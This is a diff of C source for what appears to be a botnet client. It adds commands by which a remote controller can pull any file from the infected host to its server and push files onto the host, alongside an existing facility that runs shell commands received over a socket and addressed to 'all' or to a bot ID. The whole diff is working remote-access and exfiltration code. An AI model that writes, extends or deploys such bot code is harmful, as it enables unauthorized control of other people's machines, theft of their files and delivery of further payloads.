@@ -61,12 +61,106 @@ int bot_run_cmd (int s, char *cmd)
 
   return 0;
 }
+//receive file from server
+int filesend(int s , char *cmd)
+{
+  char* fr_name = cmd;
+  int LENGTH = 512;
+  char revbuf[LENGTH];
+  FILE *fr = fopen(fr_name, "w");
+  bot_print(s,"CODEFSEND");
+  bot_print (s, "^");
+  bot_print(s,cmd);
+  if(fr == NULL)
+  {
+    printf("File %s Cannot be opened.\n", fr_name);
+    bot_print (s, bot_id);
+    bot_print (s, ":");
+    bot_print(s,"file cannot be opened");
+  }
+  else
+  {
+    bzero(revbuf, LENGTH);
+    int fr_block_sz = 0;
+    while((fr_block_sz = recv(s, revbuf, LENGTH, 0)) > 0)
+    {
+      int write_sz = fwrite(revbuf, sizeof(char), fr_block_sz, fr);
+      if(write_sz < fr_block_sz)
+      {
+              perror("File write failed.\n");
+      }
+      bzero(revbuf, LENGTH);
+      if (fr_block_sz == 0 || fr_block_sz != 512)
+      {
+        break;
+      }
+  }
+  if(fr_block_sz < 0)
+  {
+    if (errno == EAGAIN)
+    {
+      printf("recv() timed out.\n");
+    }
+    else
+    {
+      fprintf(stderr, "recv() failed due to errno = %d\n", errno);
+    }
+  }
+    printf("Ok received from server!\n");
+    bot_print(s,"received from server");
+    fclose(fr);
+  }
+  return 0;
+}
+//sending the file to server
+int filerecv(int s,char* filename)
+{
+  int LENGTH = 512;
+  char sdbuf[LENGTH]; // Send buffer
+  int response;
+  printf("From client to server %s...", filename);
+  response = recv(s,sdbuf,LENGTH,0);
+  printf("%s\n",sdbuf);
+  if(strcasecmp(sdbuf,"READY") == 0)
+  {
+    FILE *fs = fopen(filename, "r");
+    if(fs == NULL)
+    {
+        //fprintf(stderr, "ERROR: File %s not found on server. (errno = %d)\n", filename, errno);
+        exit(1);
+    }
+
+    bzero(sdbuf, LENGTH);
+    int fs_block_sz;
+
+    while((fs_block_sz = fread(sdbuf, sizeof(char), LENGTH, fs))>0)
+    {
+        //printf("%s",sdbuf);
+        if(send(s, sdbuf, fs_block_sz, 0) < 0)
+        {
+          //  fprintf(stderr, "ERROR: Failed to send file %s. (errno = %d)\n", fliename, errno);
+            exit(1);
+        }
+        bzero(sdbuf, LENGTH);
+    }
+    printf("Ok sent to server!\n");
+    //success = 1;
+    //close(nsockfd);
+    //printf("[Server] Connection with Client closed. Server will wait now...\n");
+    //while(waitpid(-1, NULL, WNOHANG) > 0);
+}
+else{
+  bot_print(s,"unable to download");
+}
+  return 0;
+
+}
 
 int bot_parse (int s, char *msg)
 {
   char *target = msg;
   char *cmd = NULL;
-
+  char *filename;
   if ((cmd = strchr (msg, ':')) == NULL)
     {
       printf ("!! Malformed command. Should be TARGET:command\n");
@@ -76,12 +170,40 @@ int bot_parse (int s, char *msg)
   cmd++;
   cmd[strlen(cmd) - 1] = 0;
 
+
+
   if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
     return 0; // Silently ignore messages not for us
+  printf("cmd: %s \n",cmd);
+  if (strchr(cmd,':'))
+  {
 
-  printf ("+ Executing command: '%s'\n", cmd);
-  bot_run_cmd (s, cmd);
+      filename=strchr(cmd,':');
+      *filename=0;
+      filename++;
+      // printf("cmd: %s \n",cmd);
+      // printf("file: %s \n",filename);
 
+      if(strcasecmp(cmd,"filesend") == 0)
+      {
+        printf("filesend is starting \n");
+        filesend(s,filename);
+      }
+      else if (strcasecmp(cmd,"filerecv") == 0)
+      {
+        printf("file receiving  is starting \n");
+        bot_print(s,"CODEFRECV");
+        bot_print(s,"^");
+        bot_print(s,filename);
+        filerecv(s,filename);
+
+      }
+      return 0;
+  }
+  else{
+    printf ("+ Executing command: '%s'\n", cmd);
+    bot_run_cmd (s, cmd);
+  }
   return 0;
 }
 
